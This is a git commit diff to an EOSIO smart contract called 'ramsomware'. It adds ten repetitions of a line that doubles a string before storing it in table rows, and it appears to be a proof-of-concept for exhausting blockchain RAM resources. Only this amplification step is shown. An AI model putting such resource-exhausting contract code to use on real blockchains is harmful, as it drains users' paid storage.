41bb7daeade3e3f2f4f75fa5c5ea516ac7fd0500
k1rh4 <k1rh4.lee@gmail.com>
2019-04-28 20:04:14 +0900

    ramsomware

--- RUN_NODE/CONTRACT/ramsomware/ramsomware.cpp
+++ RUN_NODE/CONTRACT/ramsomware/ramsomware.cpp
@@ -75,6 +75,16 @@ class [[eosio::contract]] ramsomware: public contract{
                 A = A+ A;
                 A = A+ A;
                 A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
+                A = A+ A;
                 row.s0 = A;
                 row.s1 = A;
                 row.s2 = A;
